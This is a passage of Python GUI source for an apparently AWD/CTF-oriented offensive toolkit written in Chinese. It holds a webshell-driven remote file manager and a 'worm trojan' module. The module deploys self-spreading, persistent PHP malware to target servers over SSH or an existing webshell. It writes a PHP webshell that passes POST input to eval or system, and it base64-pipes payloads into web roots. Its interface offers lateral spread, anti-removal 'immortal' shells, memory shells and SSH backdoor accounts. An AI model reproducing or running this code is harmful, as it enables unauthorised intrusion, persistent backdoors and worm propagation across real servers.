        self.fm_refresh()

    def fm_refresh(self):
        self.fm_search_mode = False
        self.fm_search_items = []
        d = self.fm_req("list", {"dir": self.fm_path.get()})
        if not d: return
        self.fm_list.delete(0, tk.END)
        if d.get("error"): self.fm_list.insert(tk.END, f'[错误] {d["error"]}'); return
        for f in d.get("items", []):
            icon = "📁" if f.get("d") else "📄"
            sz = f.get("s", 0)
            szs = f"{sz}B" if sz < 1024 else f"{sz/1024:.1f}KB" if sz < 1048576 else f"{sz/1048576:.1f}MB"
            self.fm_list.insert(tk.END, f"{icon} {f.get('n','')}  ({szs})")
        self.fm_path.set(d.get("path", "/"))

    def fm_double_click(self, event):
        sel = self.fm_list.curselection()
        if not sel: return
        is_search = getattr(self, 'fm_search_mode', False)
        if is_search:
            if sel[0] < len(self.fm_search_items):
                rel, is_dir = self.fm_search_items[sel[0]]
                if is_dir:
                    self.fm_path.set('/' + rel.strip('/') if rel.strip('/') else '/')
                    self.fm_clear_search()
                else:
                    self.fm_edit_file()
            return
        txt = self.fm_list.get(sel[0]); name = txt.split("  (")[0][2:]
        if txt.startswith("📁"):
            self.fm_path.set(self.fm_path.get().rstrip("/") + "/" + name)
            self.fm_refresh()
        else:
            self.fm_edit_file()

    def fm_go_up(self):
        if getattr(self, 'fm_search_mode', False):
            self.fm_clear_search()
            return
        path = self.fm_path.get().strip()
        if not path or path == "/":
            return
        p = path.rstrip("/")
        parent = p[:p.rfind("/")] if "/" in p else ""
        self.fm_path.set(parent or "/")
        self.fm_refresh()

    def fm_edit_file(self):
        sel = self.fm_list.curselection()
        if not sel: return
        txt = self.fm_list.get(sel[0])
        if txt.startswith("📁"): return
        if getattr(self, 'fm_search_mode', False):
            rel, is_dir = self.fm_search_items[sel[0]] if sel[0] < len(self.fm_search_items) else ('', False)
            if is_dir: return
            path = '/' + rel.strip('/')
        else:
            name = txt.split("  (")[0][2:]
            path = self.fm_path.get().rstrip("/") + "/" + name
        d = self.fm_req("read", {"file": path})
        if not d or d.get("error"): return
        self.fm_edit_title.config(text=f"✏️ {d.get('name', name)}")
        self.fm_edit_box.delete("1.0", tk.END)
        self.fm_edit_box.insert(tk.END, d.get("content", ""))
        self.fm_editor.pack(fill=tk.BOTH, pady=(4,0))
        self.fm_cur_edit = path

    def fm_save_file(self):
        if not hasattr(self, "fm_cur_edit") or not self.fm_cur_edit: return
        content = self.fm_edit_box.get("1.0", tk.END).rstrip("\n")
        d = self.fm_post("save", {"file": self.fm_cur_edit, "content": content})
        if d and d.get("ok"): self.fm_close_editor(); self.fm_refresh()

    def fm_close_editor(self):
        self.fm_editor.pack_forget()
        if hasattr(self, "fm_cur_edit"): del self.fm_cur_edit

    def fm_delete_file(self):
        sel = self.fm_list.curselection()
        if not sel: return
        txt = self.fm_list.get(sel[0]); name = txt.split("  (")[0][2:]
        if getattr(self, 'fm_search_mode', False):
            rel, is_dir = self.fm_search_items[sel[0]] if sel[0] < len(self.fm_search_items) else ('', False)
            name = rel.rsplit('/', 1)[-1]
            path = '/' + rel.strip('/')
        else:
            path = self.fm_path.get().rstrip("/") + "/" + name
        if not messagebox.askyesno("确认", f"确定删除 {name}？"): return
        d = self.fm_req("delete", {"file": path})
        if d and d.get("ok"):
            self.fm_clear_search()

    def fm_download(self):
        sel = self.fm_list.curselection()
        if not sel: return
        txt = self.fm_list.get(sel[0])
        if txt.startswith("📁"): return
        if getattr(self, 'fm_search_mode', False):
            rel, is_dir = self.fm_search_items[sel[0]] if sel[0] < len(self.fm_search_items) else ('', False)
            if is_dir: return
            name = rel.rsplit('/', 1)[-1]
            path = '/' + rel.strip('/')
        else:
            name = txt.split("  (")[0][2:]
            path = self.fm_path.get().rstrip("/") + "/" + name
        p = filedialog.asksaveasfilename(initialfile=name, defaultextension="")
        if not p: return
        import urllib.parse
        base = self.fm_base(); pw = self.password.get().strip()
        url = f"{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action=read&file={urllib.parse.quote(path)}"
        try:
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(urllib.request.Request(url), timeout=15, context=ctx) as resp:
                d = json.loads(resp.read().decode("utf-8"))
                if d.get("content") is not None:
                    with open(p, "w", encoding="utf-8") as f: f.write(d["content"])
                    messagebox.showinfo("完成", f"已下载到 {p}")
        except Exception as e: messagebox.showerror("错误", str(e))

    def fm_upload_file(self):
        p = filedialog.askopenfilename()
        if not p: return
        import urllib.parse
        base = self.fm_base(); pw = self.password.get().strip()
        url = f"{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action=upload"
        try:
            import requests
            with open(p, "rb") as f:
                r = requests.post(url, files={"f": (os.path.basename(p), f)}, data={"dir": self.fm_path.get()}, timeout=15, verify=False)
                d = r.json()
                if d.get("ok"): self.fm_refresh()
                else: messagebox.showerror("错误", d.get("error", "上传失败"))
        except Exception as e: messagebox.showerror("上传错误", str(e))

    def fm_mkdir(self):
        name = tk.simpledialog.askstring("新建目录", "目录名:")
        if not name: return
        d = self.fm_req("mkdir", {"dir": self.fm_path.get(), "name": name})
        if d and d.get("ok"): self.fm_refresh()
# ============================================================
#  Tab 4: 蠕虫木马 (修复: 裸except + 公共函数)
# ============================================================
CREEP_DIR = os.path.join(BASE, '上传靶机')

class CreepTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.cfg_file = os.path.join(CONFIG_DIR, 'creep_config.json')
        d = {'ip':'','port':'80','https':False,'shell_url':'/shell.php','shell_pass':'cmd','password':'cmd','web_root':'/var/www/html'}
        try:
            if os.path.exists(self.cfg_file):
                with open(self.cfg_file) as f: d.update(json.load(f))
        except Exception: pass
        self.cfg = d
        self.build_ui()

    def build_ui(self):
        f = tk.Frame(self.parent, bg=MON_CK['bg'])
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='目标配置', padding=6)
        f1.pack(fill=tk.X)
        # 连接模式
        r_mode = tk.Frame(f1, bg=MON_CK['card_bg'])
        r_mode.pack(fill=tk.X, pady=2)
        tk.Label(r_mode, text='连接模式:', fg=MON_CK['text'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=2)
        self.creep_conn_mode = tk.StringVar(value='webshell')
        for val, txt in [('webshell', '🌐 WebShell'), ('ssh', '🔑 SSH')]:
            tk.Radiobutton(r_mode, text=txt, variable=self.creep_conn_mode, value=val,
                command=self._switch_creep_mode, fg=MON_CK['text'], bg=MON_CK['card_bg'],
                selectcolor=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=6)
        # WebShell 面板
        self.ws_frame = tk.Frame(f1, bg=MON_CK['card_bg'])
        self.ws_frame.pack(fill=tk.X, pady=2)
        g1 = tk.Frame(self.ws_frame, bg=MON_CK['card_bg']); g1.pack(fill=tk.X, pady=2)
        tb.Label(g1, text='IP/网段:').pack(side=tk.LEFT)
        self.e_ip = tb.Entry(g1); self.e_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.e_ip.insert(0, self.cfg['ip'])
        tb.Label(g1, text='端口:').pack(side=tk.LEFT, padx=(4,0))
        self.e_port = tb.Entry(g1, width=5); self.e_port.insert(0, self.cfg['port'])
        self.e_port.pack(side=tk.LEFT, padx=2)
        self.v_https = tk.BooleanVar(value=self.cfg['https'])
        tb.Checkbutton(g1, text='HTTPS', variable=self.v_https).pack(side=tk.LEFT, padx=4)
        g2 = tk.Frame(self.ws_frame, bg=MON_CK['card_bg']); g2.pack(fill=tk.X, pady=2)
        tk.Label(g2, text='Webshell路径:', fg=MON_CK['text'], bg=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT)
        self.e_surl = tb.Entry(g2, width=16)
        self.e_surl.insert(0, self.cfg['shell_url']); self.e_surl.pack(side=tk.LEFT, padx=2)
        tk.Label(g2, text='WebShell密码:', fg='#00ff9d', bg=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,0))
        self.e_spass = tb.Entry(g2, width=16)
        self.e_spass.insert(0, self.cfg['shell_pass']); self.e_spass.pack(side=tk.LEFT, padx=2)
        tk.Label(g2, text='木马密码:', fg='#ffcc00', bg=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,0))
        self.e_cpass = tb.Entry(g2, width=16)
        self.e_cpass.insert(0, self.cfg['password']); self.e_cpass.pack(side=tk.LEFT, padx=2)
        tk.Label(g2, text='超时:', fg=MON_CK['text'], bg=MON_CK['card_bg'], font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(6,0))
        self.e_to = tb.Entry(g2, width=3); self.e_to.insert(0, '10')
        self.e_to.pack(side=tk.LEFT, padx=2)
        # Web目录输入框
        g3_web = tk.Frame(self.ws_frame, bg=MON_CK['card_bg']); g3_web.pack(fill=tk.X, pady=2)
        tk.Label(g3_web, text='Web目录:', fg='#6b7f9e', bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_webroot = tb.Entry(g3_web, width=20)
        self.e_webroot.insert(0, self.cfg.get('web_root', '/var/www/html')); self.e_webroot.pack(side=tk.LEFT, padx=2)
        # SSH 面板
        self.ssh_frame = tk.Frame(f1, bg=MON_CK['card_bg'])
        sshg1 = tk.Frame(self.ssh_frame, bg=MON_CK['card_bg']); sshg1.pack(fill=tk.X, pady=2)
        tk.Label(sshg1, text='SSH地址:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_creep_ssh_host = tb.Entry(sshg1); self.e_creep_ssh_host.pack(side=tk.LEFT, padx=4)
        tk.Label(sshg1, text='端口:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_creep_ssh_port = tb.Entry(sshg1, width=5); self.e_creep_ssh_port.insert(0, '22')
        self.e_creep_ssh_port.pack(side=tk.LEFT, padx=2)
        tk.Label(sshg1, text='用户名:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_creep_ssh_user = tb.Entry(sshg1, width=10); self.e_creep_ssh_user.insert(0, 'root')
        self.e_creep_ssh_user.pack(side=tk.LEFT, padx=2)
        tk.Label(sshg1, text='密码:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_creep_ssh_pass = tb.Entry(sshg1, width=16)
        self.e_creep_ssh_pass.pack(side=tk.LEFT, padx=2)
        tk.Label(sshg1, text='Web目录:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_creep_ssh_webdir = tb.Entry(sshg1, width=14)
        self.e_creep_ssh_webdir.insert(0, '/var/www/html'); self.e_creep_ssh_webdir.pack(side=tk.LEFT, padx=2)
        self.ssh_frame.pack_forget()
        # 使用说明
        tip = tb.LabelFrame(f, text='\U0001f4d6 木马上传使用说明', padding=6)
        tip.pack(fill=tk.X, pady=4)
        tip_txt = tk.Text(tip, height=9, bg=MON_CK['card_bg'], fg='#c8d6f0',
            font=('微软雅黑', 9), relief=tk.FLAT, wrap=tk.WORD)
        tip_txt.insert(tk.END, '''【木马上传步骤】
1. 连接模式选择：
   - 有SSH权限 → 选「SSH」，填 SSH地址/端口/用户名/密码 + Web目录
   - 只有Webshell → 选「WebShell」，填 Webshell路径/密码 + 端口
2. Web目录 = 网站根目录（Apache默认 /var/www/html；不确定可SSH执行: find / -name "index.php" 2>/dev/null）
3. 端口 = 网站外部访问端口（默认80，AWD环境通常是 88xx 之类）
4. 点「一键植入蠕虫不死马」
5. 日志显示「植入成功」即完成；「HTTP访问失败」提示不影响SSH植入，只是Web端口/根目录没填对
6. 验证：浏览器访问 http://IP:端口/.creep.php

【字段说明】
WebShell密码 = 连接你已有shell用的参数名/密码
木马密码 = 管理Creep蠕虫的密钥（默认 cmd）
扩散 = 蠕虫自动传播到其他靶机；检查扩散 = 查看感染范围；清除 = 删除蠕虫''')
        tip_txt.config(state=tk.DISABLED)
        tip_txt.pack(fill=tk.X)
        # 操作
        f2 = tb.LabelFrame(f, text='操作', padding=6)
        f2.pack(fill=tk.X, pady=4)
        g3 = tb.Frame(f2); g3.pack(fill=tk.X, pady=2)
        self.btn_implant = tb.Button(g3, text='\U0001f525 一键植入蠕虫不死马', command=self.do_implant, style='Warn.TButton')
        self.btn_implant.pack(side=tk.LEFT, padx=2)
        self.btn_dep = tb.Button(g3, text='\u25b6 部署', command=self.do_deploy)
        self.btn_dep.pack(side=tk.LEFT, padx=2)
        tk.Button(g3, text='\U0001f680 SSH\u90e8\u7f72', command=self.ssh_deploy_creep,
            bg='#7c5cff', fg='white', relief=tk.FLAT, bd=0, padx=8, pady=2, cursor='hand2',
            font=('\u5fae\u8f6f\u96c5\u9ed1', 8), activebackground='#d35400').pack(side=tk.LEFT, padx=2)
        self.btn_spread = tb.Button(g3, text='\U0001f300 扩散', command=self.do_spread)
        self.btn_spread.pack(side=tk.LEFT, padx=2)
        self.btn_check = tb.Button(g3, text='\U0001f50d 检查扩散', command=self.do_check)
        self.btn_check.pack(side=tk.LEFT, padx=2)
        self.btn_kill = tb.Button(g3, text='\u274c 清除', command=self.do_kill)
        self.btn_kill.pack(side=tk.LEFT, padx=2)
        tb.Label(g3, text='命令:').pack(side=tk.LEFT, padx=(10,0))
        self.e_cmd = tb.Entry(g3); self.e_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.btn_exec = tb.Button(g3, text='执行', command=self.do_exec)
        self.btn_exec.pack(side=tk.LEFT, padx=2)
        # ── 木马类型选择 ──
        f_type = tb.LabelFrame(f, text='木马类型', padding=4)
        f_type.pack(fill=tk.X, pady=2)
        g_type = tb.Frame(f_type); g_type.pack(fill=tk.X)
        self.worm_type = tk.StringVar(value='creep')
        for val, lbl, desc in [
            ('creep', '\U0001f577 蠕虫马(自复制)', '横向扩散+自删除'),
            ('immortal', '\u2620\ufe0f 不死马(常驻)', '防删除+进程守护'),
            ('md5', '\U0001f511 MD5马(免杀)', '密码MD5验证'),
            ('memory', '\U0001f9e0 内存马(无文件)', '仅内存执行'),
        ]:
            tb.Radiobutton(g_type, text=lbl, variable=self.worm_type, value=val).pack(side=tk.LEFT, padx=6)
        tb.Label(g_type, text=f'({desc})', foreground='#6b7f9e', font=('微软雅黑', 8)).pack(side=tk.LEFT, padx=2)
        # Generate payload variant
        tb.Label(g_type, text='自定义KEY(可选):').pack(side=tk.LEFT, padx=(12,0))
        self.worm_key = tb.Entry(g_type, width=14); self.worm_key.insert(0, 'ylphantom')
        self.worm_key.pack(side=tk.LEFT, padx=2)
        # ── WebShell 类型选择 ──
        f_sh = tb.LabelFrame(f, text='WebShell类型', padding=4)
        f_sh.pack(fill=tk.X, pady=2)
        g_sh = tk.Frame(f_sh, bg=MON_CK['card_bg']); g_sh.pack(fill=tk.X)
        self.shell_func = tk.StringVar(value='eval')
        self.shell_method = tk.StringVar(value='post')
        for val, lbl in [('eval', 'eval'), ('exec', 'exec'), ('system', 'system')]:
            tk.Radiobutton(g_sh, text=lbl, variable=self.shell_func, value=val,
                fg=MON_CK['text'], bg=MON_CK['card_bg'], selectcolor=MON_CK['card_bg']).pack(side=tk.LEFT, padx=2)
        tk.Label(g_sh, text='  Method:', fg=MON_CK['text'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(10,0))
        for val, lbl in [('get', 'GET'), ('post', 'POST')]:
            tk.Radiobutton(g_sh, text=lbl, variable=self.shell_method, value=val,
                fg=MON_CK['text'], bg=MON_CK['card_bg'], selectcolor=MON_CK['card_bg']).pack(side=tk.LEFT, padx=2)

        # ── 底部子标签 ──
        bot_nb = tb.Notebook(f)
        bot_nb.pack(fill=tk.BOTH, expand=True, pady=(4,0))
        # 子页1: 执行日志
        bot_log = tb.Frame(bot_nb); bot_nb.add(bot_log, text='  \U0001f4dd 执行日志  ')
        self.log_w = LogWidget(bot_log)
        # 子页2: SSH后门
        bot_ssh = tb.Frame(bot_nb); bot_nb.add(bot_ssh, text='  \U0001f4bb SSH后门  ')
        ssh_f = tb.Frame(bot_ssh); ssh_f.pack(fill=tk.X, padx=4, pady=4)
        r1 = tb.Frame(ssh_f); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='SSH端口:').pack(side=tk.LEFT)
        self.c_ssh_port = tb.Entry(r1, width=4); self.c_ssh_port.insert(0, '22'); self.c_ssh_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='用户名:').pack(side=tk.LEFT, padx=(6,0))
        self.c_ssh_user = tb.Entry(r1, width=10); self.c_ssh_user.insert(0, 'root'); self.c_ssh_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT, padx=(6,0))
        self.c_ssh_pass = tb.Entry(r1, width=14); self.c_ssh_pass.insert(0, ''); self.c_ssh_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='后门账号:').pack(side=tk.LEFT, padx=(6,0))
        self.c_ssh_backuser = tb.Entry(r1, width=8); self.c_ssh_backuser.insert(0, 'backdoor'); self.c_ssh_backuser.pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(ssh_f); r2.pack(fill=tk.X, pady=2)
        self.btn_ssh_back = tb.Button(r2, text='\U0001f525 植入SSH后门', command=self.do_ssh_backdoor, bootstyle='danger')
        self.btn_ssh_back.pack(side=tk.LEFT, padx=2)
        self.btn_ssh_check = tb.Button(r2, text='\U0001f50d 检查SSH后门', command=self.do_ssh_back_check, width=14)
        self.btn_ssh_check.pack(side=tk.LEFT, padx=2)
        self.ssh_back_log = scrolledtext.ScrolledText(bot_ssh, font=('Consolas', 9), bg='#0a0e17',
            fg='#c8d6f0', height=5, state=tk.DISABLED)
        self.ssh_back_log.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        for t, c in [('ok','#00ff9d'),('fail','#ff4d6d'),('info','#c8d6f0')]:
            self.ssh_back_log.tag_config(t, foreground=c)
        # 子页3: 心跳检测
        bot_hb = tb.Frame(bot_nb); bot_nb.add(bot_hb, text='  \u2764\ufe0f 心跳检测  ')
        hb_f = tb.Frame(bot_hb); hb_f.pack(fill=tk.X, padx=4, pady=4)
        self.c_hb_running = False
        self.btn_c_hb = tb.Button(hb_f, text='\u25b6 开始心跳', command=self.toggle_creep_hb, width=14)
        self.btn_c_hb.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_f, text='间隔:').pack(side=tk.LEFT, padx=(8,0))
        self.c_hb_int = tb.Entry(hb_f, width=4); self.c_hb_int.insert(0, '30'); self.c_hb_int.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_f, text='秒').pack(side=tk.LEFT)
        self.c_hb_lbl = tb.Label(hb_f, text='\u23f8 未启动', foreground='#6b7f9e')
        self.c_hb_lbl.pack(side=tk.LEFT, padx=12)
        self.c_hb_text = scrolledtext.ScrolledText(bot_hb, font=('Consolas', 9), bg='#0a0e17',
            fg='#c8d6f0', height=5, state=tk.DISABLED)
        self.c_hb_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        for t, c in [('alive','#00ff9d'),('dead','#ff4d6d'),('info','#c8d6f0')]:
            self.c_hb_text.tag_config(t, foreground=c)

    def cfg_vals(self):
        return {
            'ips': self.e_ip.get().strip(),
            'port': int(self.e_port.get() or 80),
            'https': self.v_https.get(),
            'shell_url': self.e_surl.get().strip() or '/shell.php',
            'shell_pass': self.e_spass.get().strip() or 'cmd',
            'password': self.e_cpass.get().strip() or 'cmd',
            'timeout': int(self.e_to.get() or 10),
            'shell_func': self.shell_func.get(),
            'shell_method': self.shell_method.get(),
            'web_root': self.e_webroot.get().strip() or '/var/www/html',
            'worm_type': self.worm_type.get() if hasattr(self, 'worm_type') else 'creep',
            'worm_key': self.worm_key.get().strip() if hasattr(self, 'worm_key') else 'ylphantom',
            'conn_mode': self.creep_conn_mode.get() if hasattr(self, 'creep_conn_mode') else 'webshell',
            'ssh_host': self.e_creep_ssh_host.get().strip() if hasattr(self, 'e_creep_ssh_host') else '',
            'ssh_port': int(self.e_creep_ssh_port.get() or 22) if hasattr(self, 'e_creep_ssh_port') else 22,
            'ssh_user': self.e_creep_ssh_user.get().strip() if hasattr(self, 'e_creep_ssh_user') else 'root',
            'ssh_pass': self.e_creep_ssh_pass.get().strip() if hasattr(self, 'e_creep_ssh_pass') else '',
            'ssh_webdir': self.e_creep_ssh_webdir.get().strip() if hasattr(self, 'e_creep_ssh_webdir') else '',
        }

    def _shell_req(self, s, base, c, cmd):
        method = c.get('shell_method', 'post').lower()
        if method == 'get':
            return s.get(f'{base}{c["shell_url"]}', params={c['shell_pass']: cmd}, timeout=c['timeout'])
        return s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']: cmd}, timeout=c['timeout'])

    def save_cfg(self):
        c = self.cfg_vals()
        try:
            atomic_write(self.cfg_file, json.dumps({'ip':c['ips'],'port':c['port'],'https':c['https'],
                'shell_url':c['shell_url'],'shell_pass':c['shell_pass'],'password':c['password'],
                'web_root':c['web_root']}, indent=2))
        except Exception: pass

    def log_self(self, msg, tag='info'):
        self.log_w.log(msg, tag)

    def _hp(self, ip, c):
        """解析 ip:端口 格式，返回 (host, web_port)"""
        host = str(ip).strip()
        port = c.get('port', 80)
        if ':' in host:
            hp = host.rsplit(':', 1)
            if len(hp) == 2 and hp[1].isdigit():
                return hp[0], int(hp[1])
        return host, port

    def ssh_deploy_creep(self):
        """一键部署木马：有SSH就用SSH，没SSH就用Webshell"""
        def do_deploy(vals):
            host, port, user, pwd = vals['host'], vals['port'], vals['user'], vals['pwd']
            sh_pass = vals.get('sh_pass', 'pass')
            sh_url = vals.get('sh_url', '/web/shell.php')
            def _deploy():
                try:
                    import requests, base64
                    creep_php = os.path.join(BASE, '上传靶机', '.creep.php')
                    creep_dat = os.path.join(BASE, '上传靶机', '.creep.dat')
                    if not os.path.exists(creep_php):
                        self.root.after(0, lambda: self.log_self(f'[FAIL] 找不到 .creep.php', 'fail')); return
                    # 尝试SSH模式（有SSH地址时）
                    if host and pwd:
                        import paramiko
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                        sftp = ssh.open_sftp()
                        # Web目录: 优先用界面填的, 用户明确指定则不自动探测(探测可能把/app当成/var/www/html)
                        webdir = (self.e_webroot.get().strip() or '/var/www/html').strip('/')
                        if not webdir or webdir == '/var/www/html':
                            try:
                                detect_cmd = "for d in /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d \"$d\" ] && echo \"$d\" && break; done"
                                _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                                so.channel.settimeout(10)
                                out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                                if out and out[0].strip():
                                    webdir = out[0].strip().rstrip('/')
                            except Exception:
                                pass
                        sftp.put(creep_php, f'{webdir}/.creep.php')
                        sftp.put(creep_dat, f'{webdir}/.creep.dat')
                        # 创建webshell
                        sftp.open(f'{webdir}/shell.php', 'w').write('<?php $c=$_POST["'+sh_pass+'"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                        sftp.close(); ssh.close()
                        self.root.after(0, lambda: self.log_self('[OK] SSH部署+Webshell创建成功', 'ok'))
                    else:
                        # Webshell模式（无SSH，只填了shell路径和密码）
                        with open(creep_php, 'rb') as f: b64 = base64.b64encode(f.read()).decode()
                        with open(creep_dat, 'rb') as f: b64_dat = base64.b64encode(f.read()).decode()
                        base_url = make_base(self.e_ip.get().strip(), int(self.e_port.get() or 80), False)
                        r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.php', base64_decode('{b64}'));"}, timeout=10)
                        r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.dat', base64_decode('{b64_dat}'));"}, timeout=10)
                        self.root.after(0, lambda: self.log_self('[OK] WebShell部署木马成功', 'ok'))
                    # 填写配置
                    self.root.after(0, lambda: (self.e_surl.delete(0,tk.END), self.e_surl.insert(0,sh_url),
                        self.e_spass.delete(0,tk.END), self.e_spass.insert(0,sh_pass)))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
            async_run(_deploy)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        ssh_deploy_dialog(self.parent, '🚀 一键部署木马',
            '有SSH填SSH，没SSH填Webshell路径+密码',
            [('SSH地址:', 'host', pre.get('host', ''), ''), ('SSH端口:', 'port', pre.get('port', '22'), ''),
             ('用户名:', 'user', pre.get('user', 'root'), ''), ('密码:', 'pwd', pre.get('pwd', ''), '*'),
             ('Shell路径:', 'sh_url', '/web/shell.php', ''),
             ('Shell密码:', 'sh_pass', 'pass', '')],
            do_deploy)

    def _switch_creep_mode(self):
        if self.creep_conn_mode.get() == 'ssh':
            self.ws_frame.pack_forget()
            self.ssh_frame.pack(fill=tk.X, pady=2)
        else:
            self.ssh_frame.pack_forget()
            self.ws_frame.pack(fill=tk.X, pady=2)

    def set_btns(self, enabled):
        st = tk.NORMAL if enabled else tk.DISABLED
        for b in (self.btn_implant, self.btn_dep, self.btn_spread, self.btn_check, self.btn_kill, self.btn_exec):
            b.config(state=st)

    def get_targets(self):
        raw = self.e_ip.get().strip()
        if not raw: messagebox.showwarning('警告', '请先输入目标IP'); return []
        return parse_targets(raw)

    def do_implant(self):
        ips = self.get_targets()
        if not ips: return
        self.set_btns(False); self.save_cfg()
        self.log_self('='*50, 'warn')
        self.log_self('>>> \U0001f525 一键植入蠕虫不死马', 'warn')
        self.log_self('='*50, 'warn')
        c = self.cfg_vals()
        def run():
            ok=fail=0
            with ThreadPoolExecutor(max_workers=min(10,len(ips))) as ex:
                fs = {ex.submit(self.implant_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f'  {"[OK]" if succ else "[FAIL]"} {ip}: {msg}', 'ok' if succ else 'fail')
                    ok+=succ; fail+=not succ
            self.log_self(f'一键植入完成: {ok}成功 {fail}失败', 'ok' if ok>=fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def _bases_for(self, ip, c):
        host, port = self._hp(ip, c)
        b1 = make_base(host, port, bool(c.get('https')))
        b2 = make_base(host, port, not bool(c.get('https')))
        return [b1, b2] if b1 != b2 else [b1]

    def implant_one(self, ip, c):
        try:
            php_path = os.path.join(CREEP_DIR, '.creep.php')
            dat_path = os.path.join(CREEP_DIR, '.creep.dat')
            if not os.path.exists(php_path): return ip, False, f'文件不存在: {php_path}'
            if not os.path.exists(dat_path): return ip, False, f'文件不存在: {dat_path}'
            with open(php_path, 'rb') as f: php = f.read()
            with open(dat_path, 'rb') as f: dat = f.read()
            b64_php = base64.b64encode(php).decode()
            b64_dat = base64.b64encode(dat).decode()

            # 自动判定：填了SSH地址或用SSH模式 → SSH植入；否则WebShell植入
            host, web_port = self._hp(ip, c)
            ssh_host = c.get('ssh_host', '').strip()
            conn_mode = c.get('conn_mode', 'webshell')
            use_ssh = conn_mode == 'ssh' and bool(ssh_host)
            if use_ssh:
                web_root = (c.get('ssh_webdir') or c.get('web_root') or '/var/www/html').strip('/')
            else:
                web_root = (c.get('web_root') or '/var/www/html').strip('/')
            self.log_self(f'[DEBUG] 模式={"SSH" if use_ssh else "WebShell"} 目标={ssh_host or host}:{c.get("ssh_port",22) if use_ssh else web_port} Web目录=/{web_root} Web端口={web_port}', 'info')

            # ===== SSH模式 =====
            if use_ssh:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host or host, port=c.get('ssh_port', 22),
                           username=c.get('ssh_user', 'root'),
                           password=c.get('ssh_pass', ''),
                           timeout=c.get('timeout', 10))
                try:
                    for fname, b64 in [('.creep.php', b64_php), ('.creep.dat', b64_dat)]:
                        target = f'{web_root.rstrip("/")}/{fname}'
                        cmd = f"mkdir -p {web_root} && echo '{b64}' | base64 -d > {target} && echo W_OK"
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        rc = stdout.channel.recv_exit_status()
                        out = (stdout.read().decode(errors='ignore') or '').strip()
                        errmsg = (stderr.read().decode(errors='ignore') or '').strip()
                        if rc != 0 or 'W_OK' not in out:
                            return ip, False, f'写入{fname}失败: {errmsg[:40] or out[:40] or "未知错误"}'
                    # 验证文件存在
                    verify_path = f'{web_root.rstrip("/")}/.creep.php'
                    cmd3 = f'ls -la {verify_path} {web_root.rstrip("/")}/.creep.dat'
                    stdin, stdout, stderr = ssh.exec_command(cmd3)
                    listing = (stdout.read().decode(errors='ignore') or '').strip()
                    self.log_self(f'[SSH] 文件确认:\n{listing}', 'info')
                finally:
                    ssh.close()
                # HTTP验证（失败不阻塞成功，仅提示）
                try:
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=min(c['timeout'], 8))
                    htip = f'HTTP访问: {r.status_code}' if r.status_code != 200 else f'HTTP访问OK: {r.text.strip()[:20]}'
                except Exception as e:
                    htip = f'HTTP访问失败(不影响SSH植入): {str(e)[:40]}'
                return host, True, f'SSH植入成功 | {htip}'

            # ===== WebShell模式 =====
            err = None
            for base in self._bases_for(ip, c):
                try:
                    s = _session()
                    for fname, b64data in [('.creep.php', b64_php), ('.creep.dat', b64_dat)]:
                        wpath = f'/{web_root}/{fname}'
                        cmd = f"system('echo {b64data} | base64 -d > {wpath}');"
                        r = s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']: cmd}, timeout=c['timeout'])
